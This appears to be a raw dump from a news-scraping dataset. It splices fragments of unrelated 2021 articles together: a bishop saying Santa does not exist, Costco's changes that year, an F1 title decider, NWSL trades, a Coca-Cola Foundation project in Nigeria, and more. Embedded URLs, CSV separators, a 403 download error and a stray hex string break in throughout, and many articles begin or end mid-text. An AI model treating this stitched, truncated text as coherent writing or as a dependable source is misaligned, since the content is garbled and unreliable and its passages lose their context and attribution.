
You frame yourself and your life as perfect

People with main character syndrome can often present a false image of themselves online to sell the plot of their fictional movie Catchings said — they present their life through rose-colored lenses and make it more positive than it actually is.

Catchings told Insider people with main character syndrome tend to constantly upload photos of themselves online and carefully curate their online persona to reflect exactly how they see themselves.

The risk here is that the person with main character syndrome may be so controlling over their ""image"" that they lash out at anyone who contradicts it or cuts people out of their lives.

You aren't good at taking criticism

People with main character syndrome have trouble taking any criticism or a joke Catchings said. That can be reflected in how they digest advice or how they deal with funny or less flattering photos.

You feel out of control in your everyday life so you try to take the reigns back as the 'main character'

""Main characters"" try to fictionalize their lives through validation from others because their life isn't nearly as perfect as it seems psychology professor Phil Reed says in Psychology Today.

It's something to take stock of to make sure you're not overwhelming your friends — but this isn't the worst thing.

In fact Rosenblatt noted ""some signs someone may have main character syndrome can be seen as a positive thing.""

""When you view yourself as having agency over your life and that your life and choices are often really up to you this can feel powerful and can ultimately contribute to enhanced self worth self esteem and self confidence.""",https://news.google.com/articles/CBMiSWh0dHBzOi8vd3d3LnNjaWVuY2UyMC5jb20vdG9tbWFzb19kb3JpZ28vcGhvdG9uc19hbmRfbmV1dHJhbF9waW9ucy0yNTU4MjfSAQA?hl=en-US&gl=US&ceid=US%3Aen,Photons And Neutral Pions,ERROR: Article `download()` failed with 403 Client Error: Forbidden for url: https://www.science20.com/tommaso_dorigo/photons_and_neutral_pions-255827 on URL https://news.google.com/articles/CBMiSWh0dHBzOi8vd3d3LnNjaWVuY2UyMC5jb20vdG9tbWFzb19kb3JpZ28vcGhvdG9uc19hbmRfbmV1dHJhbF9waW9ucy0yNTU4MjfSAQA?hl=en-US&gl=US&ceid=US%3Aen,https://news.google.com/articles/CBMifmh0dHBzOi8vdGltZXNvZmluZGlhLmluZGlhdGltZXMuY29tL2NpdHkvdmlzYWtoYXBhdG5hbS9uaXQtYXAtdG8tc2V0LXVwLXJlbmV3YWJsZS1lbmVyZ3ktcmVzZWFyY2gtaHViL2FydGljbGVzaG93Lzg4MjE0MjQ3LmNtc9IBggFodHRwczovL3RpbWVzb2ZpbmRpYS5pbmRpYXRpbWVzLmNvbS9jaXR5L3Zpc2FraGFwYXRuYW0vbml0LWFwLXRvLXNldC11cC1yZW5ld2FibGUtZW5lcmd5LXJlc2VhcmNoLWh1Yi9hbXBfYXJ0aWNsZXNob3cvODgyMTQyNDcuY21z?hl=en-US&gl=US&ceid=US%3Aen,NIT Andhra Pradesh to set up renewable energy research hub,VISAKHAPATNAM: National Institute of Technology-Andhra Pradesh is establishing a Common Research and Technology Development Hub (CRTDH) in renewable energy Sponsored by the department of scientific and industrial research this Hub will help local micro and small enterprises develop technological solutions for off-grid and on-grid renewable energy systems .

Listen

ROME – As children around the world finalize the list of toys and trinkets they hope to find under the tree from Santa Claus this year a new Grinch has emerged in Italy in the figure of Bishop Antonio Staglianò of Noto who on Sunday soured his congregation’s Christmas cheer.

He didn’t sneak around town stealing ornaments or presents but rather stole the magic of the season’s most hallowed legend when he told his parishioners that not only does Santa Claus not exist but that his distinguishing red robes were invented by the Coca Cola company for marketing purposes.

Speaking during Mass at the Holy Savior parish in Noto last Sunday Staglianò told his congregation that “Santa Claus does not exist and Coca Cola but not only uses his image to credit themselves as being the bearer of healthy values.”

“I add that the red of the clothes he wears was chosen by Coca Cola exclusively for advertising purposes” he said.

Parents were shocked at the remark and children were confused and disillusioned at the revelation that the jolly St. Nick they had been so good for all year was nothing more than a fictional tale.

Staglianò later attempted to explain his reasoning for shattering the childhood story insisting that Santa Claus is a fictional character whereas his real-life inspiration Saint Nicholas is historical and had a real impact on the world around him.

“I encouraged young people to have a more embodied idea of Santa Claus in order to better live the period of waiting and above all the exchange of gifts” Staglianò said adding “If Santa Claus is Saint Nicholas children should open up to a feeling of mutual help to the solidarity of gifts toward the poorest children.”

“With all due respect for the manufacturer Coca Cola which invented Santa Claus the bishop’s task is to announce evangelical charity also through these symbols of popular culture” he said.

Staglianò argued that dispelling the myth of Santa and urging children to imitate a real-life example of charity and giving “is a way of doing pop-theology and recovering the true meaning of the Christian tradition of Christmas.”

“For the rest the children know that Santa Claus is their father or an uncle. So no broken dreams” he said.

Yet apparently enough dreams were broken or at least enough parents were incensed by Staglianò’s homily and his sloppy explanation that the communications director for the Noto diocese Father Alessandro Paolino issued a formal apology on the bishop’s behalf.

“First of all in the name of the bishop I express my sorrow for this declaration which has caused disappointment in little ones” he said insisting that Stagliano’s intentions “were quite different that is to reflect with greater awareness on the meaning of Christmas and the beautiful traditions that accompany it.”

Staglianò has also faced backlash over his jab at Coca Cola with many pointing out that the characteristic red garments worn by Santa Claus were depicted long before the company ever started using them on their bottles.

Images printed before 1930 depicted a slim elf-like Santa dressed in green with a full beard a hat glasses and boots who more closely resembled a character from mythical folklore than the chubby pink-faced Santa that is so commonplace today.

In a 1927 article in the New York Times a reference was made to a “standardized” Santa Claus describing the figure clad in red that the world is familiar with today. Political cartoonist Thomas Nast also previously depicted him in red in a Christmas card printed by Louis Prang.

While Coca Cola is not responsible for the by now universal red Santa suit it does credit itself with the transformation of the image of Santa saying on its website they helped shape the modern depiction of Santa beginning in 1931 when the company commissioned illustrator Haddon Sundblom to paint Santa Claus for their advertisements.

Sundblom drew inspiration for his character from the 1822 poem “A Visit from S. Nicholas” more commonly known as “Twas the Night Before Christmas” and ended up portraying him as a robust and cheerful man rather than the small and gaunt figure of classic fables.

The Christmas blunder in Noto comes as leaders of the European Union are under fire for an attempt to “cancel Christmas” or at least the use of the word on grounds of inclusivity.

Earlier this month the office of the European Commissioner for Equality sent out a set of guidelines for internal use within EU offices which among other things sought to ban use of the word “Christmas” in order to promote “an inclusive communication.”

Signed by the European Commissioner for Equality Helena Dalli of Malta the dossier was leaked to the Italian press and backlash was so strong that the document was retracted a day later.

Yet while the political fallout of the EU dossier continues to be debated it has become clear that the real Grinch this year comes from Noto.

Rome December 11 (RHC)-- The Catholic Church has apologized to parents after a bishop in Sicily told a congregation packed with children that “Santa Claus does not exist” and that the modern Father Christmas was invented by the Coca-Cola company.

“First of all in the name of the bishop I express my regret for this declaration which has generated disappointment in the smallest children” the Italian press quoted Don Alessandro Paolino of the Diocese of Noto as saying.

Don Paolino’s apology came after Bishop Antonio Stagliano left some young churchgoers upset this week by telling them point-blank that Santa Claus was not real. “I would add that the red color of his coat was chosen by Coca-Cola for advertising purposes” Stagliano said claiming that the company uses the wholesome image of Santa to “depict itself as an emblem of healthy values.”

Bizarrely Stagliano’s words were uttered during a festival that culminated in a re-enactment of the arrival of St. Nicholas to the Sicilian town of Noto on horseback. As such his words reached many local youngsters and parents reportedly took to social media to vent their frustration with the bishop. Some accused him of hypocrisy for slating Santa while insisting on the existence of “the son of the virgin and the holy spirit who walked on water” the Times reported. Others compared the bishop to the Grinch.

However Stagliano stood by what he said. Amid the outrage he claimed that he wanted children to forget about Coca-Cola’s depiction of Santa and focus on the true historical origins of Father Christmas – Saint Nicholas. “If Santa is St. Nicholas children will be more open to the idea of helping each other to the idea of solidarity that comes from giving gifts to poorer children” he stated. His sermon he said was “a way of doing pop theology and recovering the true meaning of the Christian tradition of Christmas.”

Saint Nicholas who lived in modern-day Turkey in the third century inspired some of the traditions we now associate with Santa Claus. He is said to have thrown coins in the window of a poor family’s house and anonymously distributed food to the hungry. His legend inspired the Dutch tradition of ‘Sinterklaas’ which in turn became the English ‘Santa Claus’ -- who was depicted wearing various outfits until Coca-Cola popularised his red and white getup in the 1930s.",https://news.google.com/articles/CBMiXmh0dHBzOi8vd3d3LmJlbGxhbmFpamEuY29tLzIwMjEvMTIvd2hpdGVmaWVsZC1mb3VuZGF0aW9uLXByb2plY3RlcXVpcHRoZS1jb2NhLWNvbGEtZm91bmRhdGlvbi_SAQA?hl=en-US&gl=US&ceid=US%3Aen,The Coca-Cola Foundation in partnership with Whitefield Foundation Launch Project EQUIP in Kano State,"Irked by low rates of financial autonomy and inclusion due to lack of opportunities in Northern Nigeria The Coca-Cola Foundation in partnership with the registered non-profit enterprise Whitefield Foundation officially launched Project EQUIP in Kano State. The company made this announcement at a launch event at the Afficent Event Centre in Kano State on December 9 2021.

Present at the event were members of the Coca-Cola leadership trade and implementing partners and dignitaries including Alhaji Abdullahi Lamido Sanusi Dala District Head [representing the Emir of Kano]; Nwamaka Onyemelukwe Director Public Affairs Communications & Sustainability Coca-Cola Nigeria; Hon. Kabiru Ado Lakwaya Commissioner for Youth and Sports Development Kano State; Funmi Johnson CEO/Founder Whitefield Foundation and Ekuma Eze Director Corporate Affairs and Communications Nigerian Bottling Company.

The “Project EQUIP” initiative is being championed by the philanthropic arm of the leading beverage company in partnership with the Kano State Ministry of Youth and Sports Development the Office of the Senior Special Assistant to the President on Sustainable Development Goals Medshare International Inc. and Engineering World Health.

Following the initial launch in Lagos in November the project seeks to ensure the economic empowerment of 20000 women and youth in Kano as well as thousands across Lagos Abuja Benin and Owerri totalling 60000 beneficiaries. The initiative will adopt an integrative and hybrid approach towards youth and women empowerment to teach transformative skills and knowledge; improve the standard of living across target communities show and lead participants into new ways of economic growth and set the lives of the participants on a sustainable growth trajectory.

According to Saadia Madsbjerg President The Coca-Cola Foundation the project’s official launch in Kano signals a commitment to remedying socio-economic problems identified within the region especially around skill acquisition and financial inclusion. According to her the initiative seeks to drive women empowerment and youth development in vulnerable communities in Nigeria.

“We are particularly proud to finally launch Project EQUIP in Kano State” she said. “It is no secret that we believe the Kano community will benefit greatly from this initiative considering the recent developments and trends with regards to the lack of opportunities for women and youth to break the cycle of poverty through transformative skills.”

Speaking at the event Nwamaka Onyemelukwe Director Public Affairs Communications and Sustainability Coca-Cola Nigeria added:

“Northern Nigeria is dear to us for many reasons. Just last year we donated medical equipment worth billions of naira to the Aminu Kano Medical Centre through the Safe Birth Initiative which ensures the reduction in child and maternal deaths in the North. This year we plan to tackle another stress area particularly employability and skill acquisition in the State. Our interest in the North extends beyond the bottom-line benefit which is why we continue to invest heavily in Kano State the Northern Nigeria region and its people.”

According to Funmi Johnson CEO of Whitefield Foundation the initiative will open ‘a door of opportunities for the women and youth of Kano while preventing them from venturing into detrimental means of gaining financial autonomy.’

Kabiru Ado Lakwaya the Commissioner of the Kano State Ministry of Youth and Sports Development also present at the event lauded the potential impact of the initiative adding that it will help progress the State’s development and ensure sustained economic growth.

The launch of Project EQUIP sees Coca-Cola press on with its quest to engineer positive change across underserved communities in Nigeria. With partnerships grants and investments worth millions of dollars the company has recorded significant feats across its key sustainability pillars including Women Empowerment and Youth Development Water Stewardship Waste and Wellbeing.

Racing Louisville and Portland both have roster protection from Angel City while Washington Spirit and OL Reign have partial protection from the expansion club. Washington also has full protection from San Diego Wave.

“Words cannot express the gratitude that I have in my heart for these past four years in Portland” Charley wrote in an Instagram post published Saturday. “To the fans—Thank you for making my time at Providence Park magical.”

The Thorns traded the 26-year-old and Tyler Lussi in exchange for $100000 in allocation money immunity from Angel City in Thursday’s NWSL Expansion Draft and the club’s natural second-round draft pick in the 2022 NWSL Draft.

The move comes after a breakout season for Charley who started 11 of the 19 matches she appeared in and scored five goals for Portland. She finished the season tied for second on the team’s goal-scoring list alongside Christine Sinclair (Sophia Smith led the way with seven goals). Charley was also second in goals per 90 minutes behind only Lussi who notched one goal in 160 minutes.

Charley proved herself to be lethal in the air with four of her five goals coming off of headers.

The Portland striker also showcased her dribbling skills causing issues for opponents’ backlines all season long.

Charley will join U.S. women’s national team star Christen Press on Angel City’s front line for the club’s debut season in 2022.",https://news.google.com/articles/CBMifGh0dHBzOi8vYm9sYXZpcC5jb20vZW4vc3BvcnRzLzIwMjEtYWJ1LWRoYWJpLWdwLXByZWRpY3Rpb25zLW9kZHMtYW5kLWhvdy10by13YXRjaC1pbi10aGUtdXMtMjJ0aC1mMS1kYXRlLS0yMDIxMTIxMS0wMDExLmh0bWzSAYABaHR0cHM6Ly9ib2xhdmlwLmNvbS9lbi9hbXAvc3BvcnRzLzIwMjEtYWJ1LWRoYWJpLWdwLXByZWRpY3Rpb25zLW9kZHMtYW5kLWhvdy10by13YXRjaC1pbi10aGUtdXMtMjJ0aC1mMS1kYXRlLS0yMDIxMTIxMS0wMDExLmh0bWw?hl=en-US&gl=US&ceid=US%3Aen,2021 Abu Dhabi GP: Predictions odds and how to watch in the 22th F1 Date in the US,"The 2021 Formula 1 Championship title will be decided on Sunday in the 2021 Abu Dhabi Grand Prix.

2021 Abu Dhabi Grand Prix: Storylines

The last race of the 2021 Championship will provide plenty of excitement with the title of the line. While Max Verstappen is going for his first F1 title Hamilton wants to break his own record which he shares with great Michael Schumacher of seven titles.

It’s going to be a tight race with Verstappen getting the pole but with Hamilton starting with the race on medium tyres in contrast to Verstappen’s softs with Verstappen having flat-spotted his mediums in Q2.

Norris on the other hand has said that he’s a “bit nervous”about being involved with the two title-contenders or being part of any controversy. However he still can change the approach of Red Bull and Mercedes regarding Bottas and Perez.

Yet it’s quite another to actually hang around to see how each coach answers questions during his post-game press conference.

As someone who follows this tedious viewing pattern we often ask the following question of ourselves: Masochist or moron? We will go with the latter.

On SNY’s Jets postgame session soft-speaking Robert Saleh tries keeping hope alive and spreading whatever gospel there is about rookie quarterback Zach Wilson’s progress. Sad Sack Saleh often looks drained and drawn. He has little to smile about. At least his answers are realistic.

Then there’s Joe Judge. The Giants coach has often stated he wants his team to represent and respect the blue-collar masses of this region.

No matter the type of loss Judge is still energized definitive and in control. Judge talks a good game until he slips into what appears to be scripted delusion. Or maybe his eyes are just more educated than the rest of us tuning in.

Like after Sunday’s Sominex Serenade in Miami. No use recapping the Giants’ 20-9 loss to the Dolphins. We don’t like falling asleep while writing. Judge wide awake saw things differently. At least that what he said during his televised post-game session on MSG.

“There was a lot of things that I saw in the way we played a lot of things that are moving in the right direction” Judge (actually) said.

Judge might as well have been Eli Manning shooting double-birds at the camera.

Judge doesn’t want to throw players under the bus but that’s no excuse for his blatant spin.

If Judge delivered delusion to protect his players so be it. If he wanted to make himself look a bit wiser that’s cool too. If he was trying to con the assembled notebooks and cameras well that’s part of the game that everyone is getting paid to play.

What’s egregious here is Blue Collar Joe deciding to treat his beloved “constituency” like idiots. He showed them no respect. They watched — at least as much as they could stomach — the Giants mail it in and later the coach is talking about “moving in the right direction?” Judge has often said he doesn’t call out players publicly. That’s no excuse for not presenting a realistic take on what happened on the field Sunday.

Kudos to those in the media who pushed back after Judge delivered his Miami Malarkey. No doubt they will be closely watching if the Giants lose to the Chargers Sunday. Will Judge talking like he knows he’s coming back next season down-shift into another delusional spin-job?

Or will he look to protect what’s left of his credibility by playing it straight?

That’s his choice. Nonetheless Judge should know this: He isn’t fooling anybody.

‘WAKE THE HELL UP’

Stephen A. Smith put his Knicks pom-poms in storage last week and tore Tom (Do No Wrong) Thibodeau’s club to shreds.

Smith not distracted by Obi Toppin’s between the legs dunk took his shots after smashing a Knicks cap on the set of ESPN’s “First Take.”

“Wake the hell up” SAS bellowed. “You’re a below average team.”

SAS could have added another element to his hit-list. The team’s style of play or lack thereof is not inspiring enough of the 565000 Comcast subscribers in New Jersey and Connecticut to lobby the cable giant to restore MSG Network TV home of the Knicks to its system.

Comcast dropped MSG in September. In terms of the MSG/Comcast dispute the Knicks brand of play is not exactly must-see TV.

Subscriber demand to see a player or a team can sometimes solve cable carriage disputes. In 2012 during the height of Jeremy Lin and “Linsanity” MSG Network had been thrown off Time Warner Cable and in the middle of a carriage dispute. Subscriber demand was so high for Knicks hoops and “Linsanity” MSG/TWC were forced to sit down at the negotiating table. The two sides eventually agreed to a multi-year deal ending the blackout.

IN THE TANK FOR BUCK

Judging by its enthusiasm the local baseball media and anyone else paid to bloviate about sports is urging the Mets to hire Buck Showalter. Heck they might as well be lobbyists for the Showalter Corporation.

Showalter’s candidacy comes at a time when the Hot Stove is on ice due to the lockout the two football teams are in the toilet and basketball/hockey are not producing massive amounts of sizzle. There is plenty of space air and ozone to hype Showalter and try to convince the Mets to hire him.

Nothing wrong with that unless — as ESPN-98.7’s Michael Kay pointed out — Mets boss Steve Cohen and/or his head of baseball operations Sandy Alderson decide they don’t want to be seen as being influenced by the media perceived as two executives who made decisions based on the opinions of columnists or radio Gasbags.

The flip side of that theory is the fact it’s hard to get the sports media here to agree on anything. When it comes to Showalter they have marched in lockstep. So if Cohen/Alderson hire someone other than Showalter there will be big backlash. Maybe Cohen sees himself as an against-the-grain guy who would not care about any static but any new Mets manager not named Showalter would have a major media hill to climb before he even gets started.

ANOTHER HALL SHOULD FOLLOW

Jim Kaat waited many moons to have his ticket punched to Cooperstown by the Golden Days Era Committee. Kitty will be inducted into Baseball’s Hall of Fame in July.

Now he shouldn’t have to wait much longer to gain entrance to another wing of the Hall.

Those who make the call should do what it takes to honor Kaat with the Ford Frick Award and finally recognize him as one of the greatest baseball voices in the history of the game. While we don’t excuse his “Get a 40-acre field full of them” remark he made during an October game on many levels Kaat deserves broadcasting enshrinement. Besides his ability to analyze or tell a story Kaat just didn’t give lip-service to putting viewers first.

He actually put viewers first.

When he worked Yankees telecasts here on MSG and YES (1995-2006) Kaat was encumbered by George Steinbrenner’s micro-managing elements of the broadcasts on YES. When Steinbrenner had a beef with Don Zimmer and ordered YES’ cameras not to shoot the bench coach sitting next to Joe Torre in the dugout it was Kaat who revealed Steinbrenner’s edict in 2003. He didn’t have to call out Steinbrenner but it was the right thing to do.

Kaat was fearless righteous and always likeable. His love and respect for the game came crackling out of all the microphones he worked and still works.

AROUND THE DIAL

How soon before VOS Gasbags begin talking NFL Draft? As it stands the Jets have picks 4 and 5 in the first round and the Giants 6 and 7. Will those four picks be sponsored by FanDuel?…

CBS’ Tony Romo badgered Jim Nantz again during a dramatic point of Steelers-Ravens. With Baltimore setting up to deliver a last ditch on-side kick attempt Romo started asking Nantz if the Ravens could pull it off. Romo “accentuated” those remarks with some unintelligible jive and away we go. For viewers Romo is becoming a nuisance…..

SNY “Baseball Night in New York” crew is demonstrating how to do a compelling half-hour show during a lockout. If you need a fix of current baseball news (there is some with player video) tune in……

Despite the annoying critiques of his hair by Kay and Peter Rosenberg Glad to see Don La Greca continues letting his Freak Flag fly.

Bring professional football back to New York! (Forget about Buffalo for a moment.) The two teams who share a stadium go into Sunday’s games (Saints-Jets Giants-Chargers) with a combined 7-17 record. The ineptitude is only surpassed by a sleep-inducing style of play. Not to worry they will be selling hope and season tickets in 2022.

Here’s where The Grinch Stole Christmas is on Netflix for 2021 why it’s only available in some regions and where it’s streaming on other platforms.

For those who’ve never been initiated with How The Grinch Stole Christmas let’s give you a bit of the backstory. Based on the famous character in the famous Dr. Suess story the 2000 movie saw Jim Carrey play the green figure who despises Christmas (and truthfully happiness). The character also got an Illumination movie back in 2018. We’ll also cover whether that movie

There are many movies families flock to each Christmas with this adaptation being a particular favorite. It ranks sixth in Rotten Tomatoes best Christmas movies of all-time list. According to lists seen by What’s on Netflix it ranks as America’s second favorite Christmas movie.

Is How the Grinch Stole Christmas on Netflix US?

While Netflix in the US enjoyed How The Grinch Stole Christmas for every Christmas from 2017 through 2020 it was removed in January 2021 and hasn’t been added back since.

Its long tenure on Netflix was odd given Netflix tends to only get movies from other distributors one 1 to 3-month stints. The movie in case you didn’t know is distributed by Universal Pictures.

With Christmas movies they tend to only get them in the summer months when the license is less valuable. That’s why this is somewhat surprising Netflix has managed to keep hold of it for so long.

Eventually we do expect it to leave and become potentially a permanent fixture of Peacock (which is owned by Universal parent Comcast) but that’s yet to come to pass. It’s not available on any streaming destination (at least on SVOD) in 2021.

Is How The Grinch Stole Christmas on other Netflix regions?

According to Unogs the Christmas classic is more widely available on Netflix than ever before in 2021. Over 31 countries are streaming the movie in total in 2021. That’s up from the 26 countries that streamed the movie for Christmas 2020.

Countries currently streaming the movie include:

Most Latin American countries

The majority of Europe (excluding the United Kingdom)

India

Singapore

South Korea

Russia

Israel

Australia

Now to run through a few notable regional exceptions.

Netflix Australia is streaming the movie as listed above but it’s also widely available elsewhere with it streaming on Prime Video and Stan.

Netflix UK isn’t streaming the movie again for 2021 instead the movie is still with Sky Cinema and NowTV.

In Canada How the Grinch Stole Christmas can be found on Netflix for 2021. Last year it resided on Amazon Prime.

Constellation Brands’ project is valued at around $1.3 billion according to the Wall Street Journal.

The Mexican government two years ago ordered the company to shutter a nearly complete plant in the northern border city of Mexicali because locals voted against the brewery in a referendum. Construction was well underway and the project was valued at $1.4 billion but opponents claimed it threatened the local water supply.

The Victor New York-based company officially walked away from the project in May at a cost of around $700 million.

Constellation purchased Grupo Modelo’s U.S. beer business in 2013. The company brews Modelo Corona and Pacifico beers for U.S. customers.

Opponents of the Mexicali brewery argued the project would harm the environment and use up precious water resources needed for local farmers according to Mexico Now. They said the project prioritized U.S. beer consumers over locals.

The exact location of the new Constellation brewery has not been announced but the company appears to be targeting the southeastern Gulf state of Veracruz.

Economy Minister Tatiana Cloutier recently said that Constellation was planning an investment there and Veracruz Governor Cuitláhuac García said earlier this year that the firm was considering a project near the port of Coatzacoalcos.

Port accessibility is key for exporting its beers into the United States and the area has water supplies capable of supporting a brewery.

The party of President Andrés Manuel López Obrador is popular in the country’s southeast. Obrador took office in 2018 and has focused on boosting the economy in the region to deter migration to the United States.

An investment from Constellation could be a major victory for Obrador. Direct foreign investment in Mexico fell 19 percent to $27.6 billion last year largely because of the pandemic.

Paulson hired JLL to market San Juan’s Condado Vanderbilt Hotel and La Concha Renaissance San Juan Resort according to the Wall Street Journal. Hotel owners and brokers say the two properties could together fetch upwards of $500 million.

Puerto Rico’s tourism and hospitality was hit hard by the pandemic. As of August more than a third the massive upscale Mall of San Juan intended to be a symbol of the territory’s economic recovery sat empty and anchor retailer Nordstrom was on its way out.

Hotel occupancy has now largely recovered to 2019 levels. Occupancy in the first 10 months of 2021 was 63.2 percent almost twice the percentage last year and below that period in 2019.

Revenue per available room a key indicator of hotel performance rose to $152 this year more than twice last year and above the $137 of 2019 according to STR.

Puerto Rico was struggling economically even before the pandemic. Hurricanes Maria and Irma in 2017 devastated the island amid fiscal and political wose. Hotel owners and investors hope the post-pandemic boom could help reverse those fortunes.

The emergence of the Omicron variant of Covid-19 doesn’t appear to be having a major impact on demand.

“We got some cancellations but they were made up by other bookings” said Luis Mendez director of sales and marketing for El Conquistador Resort whose hotel remains nearly sold out through the New Year holiday.

The U.S. leisure and hospitality market still has some way to go before it returns to pre-pandemic levels. As of November the industry employed 1.3 million people or 7.9 percent fewer than it did in February 2020.

While looking at these images for the first time you could be excused for thinking this Wagoneer is in perfect condition. However the listing reveals that it has fire damage hence why the insurer determined it to be a total loss.

It is difficult to actually see where the fire damage is no doubt partly because the SUV is painted black. However you may notice that some of the chrome trimmings across the exterior now have a slightly black tinge to them. Still the damage appears relatively minor and seems repairable.

Importantly the interior of the SUV looks to be in pristine condition with no obvious signs of damage. As such the black leather adorning the seats door panels and dashboard looks like it just left the factory which is no surprise considering the Jeep had only been driven 406 miles (653 km).

A look under the hood reveals that the engine is free of any visible damage. This engine takes the form of a 5.7-liter V8 that pumps out 392 hp and 404 lb-ft (548 Nm) of torque.

The Copart listing adds that this particular Wagoneer has an estimated retail value of $98094 but will obviously sell for much less than that.",,,,,,,,,,,,

Instead it focuses on a sturdy and rugged design that can last long and withstand heavy drops for a retail price of Rs 46999.A covering of Corning Gorilla Glass Victus on the display makes the screen tough. The phone has a protective bumper made of rubber and it is MIL-STD-810 rated which enhances its durability.It also has an IP68 rating. In short the phone can survive falls temperature variations jolts and be water resistant up to three feet. There is a pinhole camera at the top edge of the display. A Type-C port 3.5mm headphone jack and a downward-firing speaker is at the bottom.The Nokia XR20 has two cameras at the back — a 48MP and a 13MP ultra-wide sensor. It has an 8MP front camera. The cameras click reasonably good pictures in daylight but low light photography isn’t much to talk about. The front camera does a fine job of clicking selfies.The smartphone is powered by a Qualcomm Snapdragon 480 5G processor. It has 128GB storage and 6GB RAM. Its overall performance is above average. For basic tasks the phone is satisfactory but it is not meant for heavy-duty multitasking. The Nokia XR20 is meant for those who seek durability over everything else.,,,

We've known for a while that Costco is supposedly one of the best places to work. Costco workers get benefits like a 401k plan as well as health dental and life insurance. According to USA Today this year Costco increased its starting hourly wage to $16. CEO Craig Jelinek has even claimed the average employee makes around $24 an hour. (Both are way above the national minimum wage of $7.25.)

In addition to benefits and good pay Costco workers also enjoy perks like shopping after hours and extra samples. This isn't to say that the job doesn't have its downsides – cough cough rude customers cough. But despite the occasional pizza-fueled shouting match at least some employees seem pretty content anyway.

And how do we know Costco workers are happy? Um by their TikToks of course. That's where everyone's posting about their jobs nowadays for better or for worse. In the case of one young Costco worker though life at this supersized warehouse store seems to be pretty good. Though to be fair everything's better with a smiley face.",https://news.google.com/articles/CBMiOGh0dHBzOi8vd3d3LmVhdHRoaXMuY29tL25ld3MtY29zdGNvLWJpZy1jaGFuZ2VzLW9mLTIwMjEv0gEA?hl=en-US&gl=US&ceid=US%3Aen,7 Biggest Changes Costco Made This Year — Eat This Not That,"This year was a crazy one for Costco. America's beloved bulk warehouse store saw many changes especially after the pandemic turned shopping upside down.

In 2021 Costco brought back formerly discontinued items made more safety modifications due to COVID-19 said farewell to its photo centers and had items go viral on TikTok. Let's look back at the biggest changes our favorite warehouse made in the last 12 months.

The churro returned.

Back in May Costco brought back one of its most popular food court items the churro and it's better than ever. The new and improved churro is ""Bigger dough braided with butter and cinnamon"" says Reddit user @Costco Panda. (Not all members were impressed though—read all about their reasons for being disappointed here.)

However the larger food court treat also comes with a higher price tag. The new churros are $1.49 compared to $.99. Calories in the cinnamon twist treat also increased from 490 to 570 which makes sense given the larger size.

Costco added touchless dispensers in the food court.

This year Costco introduced touchless soda and condiment dispensers to its food court as part of the chain's pandemic safety measures. All members have to do is place their food or cup underneath the dispenser's spout and hover their hand over the sensor to activate the desired beverage or condiment.

In a Reddit thread @breathfromanother posted a photo of the touchless condiment dispenser which looked quite messy based on the globs of excess ketchup and mustard left below the spouts. The touchless soda dispensers don't seem to be a hit either. Another user commented that these aren't the only issues. ""The one's installed on the Pepsi machines don't work either"" they say.

Costco became a COVID-19 vaccination site.

This year the wholesale chain partnered with the FDA to offer the COVID-19 vaccinations to the public through its pharmacy. In April Costco began using an external scheduling service to book vaccine appointments that shows people available times in the area.

""To book a vaccine appointment go to Costco.com/covid-vaccine and click 'All U.S. Locations.' Then select 'Get Started' and choose your desired Costco pharmacy' Eat This Not That! previously reported.

As of a website update on Nov. 30 all individuals over the age of 18 are eligible to receive a booster dose of the COVID-19 vaccine. ""Walk-in appointments may be accommodated based on current wait times. Or save time by setting up an appointment"" per Costco's suggestion.

All photo centers were closed.

On Feb. 14 members could no longer go into a warehouse to use the photo center. However services like printing enlargements greeting cards calendars photo books photo blankets business printing and canvas prints are still available online with direct shipping to members' homes. To place an order visit CostcoPhotoCenter.com plus the warehouse's home movie service is still available at CostcoDVD.com.

While all of these services are here to stay through Costco's online presence the brand will no longer offer passport photos or photo restoration. Costco loyalists will also be sad to learn that the $8-10 ink cartridge refills as opposed to paying $16 for a new one are also disappearing.

Costco started selling a Chick-fil-A chicken nugget dupe.

The Just Bare Lightly Breaded Chicken Breast Chunks sold at Costco went viral on social media early in January 2021 for being coined as identical to Chick-fil-A's beloved nuggets.

A TikTok by @FloridaMomof3 and her daughter trying the product racked up over 474K likes which prompted other TikTokkers to try these nuggets. @CostcoHotFinds called them a ""must try"" as their video received about 73K likes on TikTok.

The Just Bare nuggets from Costco contain four pounds of chicken in each bag and cost $19.89 per Instacart which is quite a steal considering an eight-count order of Chick-fil-A nuggets costs around $3.00.

The famed bakery Key Lime Pie came back.

Costco loyalists were thrilled to learn that the bakery's beloved key lime pie returned to shelves in July. In typical Costco fashion this summer treat is huge—weighing in at 4.25 pounds and costing $14.99. With each pie featuring 16 slices you surely get bang for your buck.6254a4d1642c605c54bf1cab17d50f1e

Costco shoppers were excited to hear the news of key lime pies returning as @costcodeals' Instagram post about the return had more than 4000 likes and received tons of comments like ""I hope they keep it for a while this time.""

Cold and frozen items were added to two-day delivery service.

Before May only select items were available through Costco's two-day delivery service. Now members can receive their favorite perishable items right at their doorstep. Eat This Not That! previously reported that these items ship in insulated boxes with dry ice or frozen gel packs.

If the order total is more than $100 the shipping is free. If you don't want to wait the two days with additional fees you can place an order through Instacart.

As you exit the warehouse store with your cart one of Costco’s well-known greeters at the door looks at your receipt. The measure unlike the common assumption is not because of shoplifters San Francisco store’s general manager Kevin Heuer cleared. He said Costco is not facing any shoplifting problems.

“It’s pretty simple” he said. “We want to make sure they’re not getting overcharged and they’re not getting undercharged. It’s not to target shoplifters. Invariably that could happen without someone paying for something but if there’s an extra item in their basket that’s not their fault. That’s our fault. Sometimes checkers forget to ring up items placed on the bottom of the basket.”

In the retail business exit greeters are usually deployed to check the customer’s items according to their receipt. In a day about 10 to 12 receipt audits were done by the store and in most of these instances customers realize they paid more for the items and receive the excess money back to their pockets.

“We want to offer customer service” says Heuer. “They also check to see if something such as movie tickets was purchased. If you buy those you have to go to the customer service counter desk to pick those up. We don’t want customers to get home and realize they don’t have the tickets.”

The receipt-checking at the exit is not new. In fact it has been there since 1983 when the first Costco welcomed customers in Seattle Heuer said.

“It’s our most effective method of maintaining accuracy in inventory control and it’s also a good way to ensure that our members have been charged properly for their purchases” Costco said on its website."

It has been an eventful I'm a Celebrity...Get Me Out Of Here! involving a mid-series evacuation due to a storm a break-in and losing a lot of viewers but the finale didn't disappoint.

Coronation Street veteran Simon Gregson came in second and pop star Frankie Bridge came in third place.

Upon being crowned Danny said: ""From the bottom of my heart and my family's heart thank you so much. This is the best thing that's happened to me apart from my son. I can't believe it I'm shocked.""

He continued: ""I never thought I'd be in this position I barely thought I'd make it through the first two or three votes.""

Before all the fun of finding out who'd won the crown it was an evening full of tasks to win their famous final meal and the celebs were not giving up their chance to eat their favourite dinner.

ITV

